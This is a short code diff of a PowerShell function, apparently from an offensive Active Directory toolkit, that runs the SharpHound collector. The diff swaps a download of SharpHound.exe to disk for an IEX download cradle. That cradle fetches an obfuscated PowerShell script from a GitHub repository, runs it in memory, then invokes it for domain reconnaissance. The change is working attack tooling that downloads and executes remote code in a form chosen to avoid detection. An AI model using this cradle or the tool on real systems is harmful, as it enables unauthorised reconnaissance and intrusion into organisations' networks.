@@ -1611,11 +1611,9 @@ function sharphound
     $Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
     pathcheck
-    Invoke-WebRequest -Uri 'https://github.com/BloodHoundAD/BloodHound/raw/master/Ingestors/SharpHound.exe' -Outfile "$currentPath\Domainrecon\Sharphound.exe"
-    
+    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/Invoke-Sharp.ps1')
     Write-Host -ForegroundColor Yellow 'Running Sharphound Collector: '
-    .\DomainRecon\Sharphound.exe -c All
-
+    Invoke-Sharp
 }
 
 function privescmodules
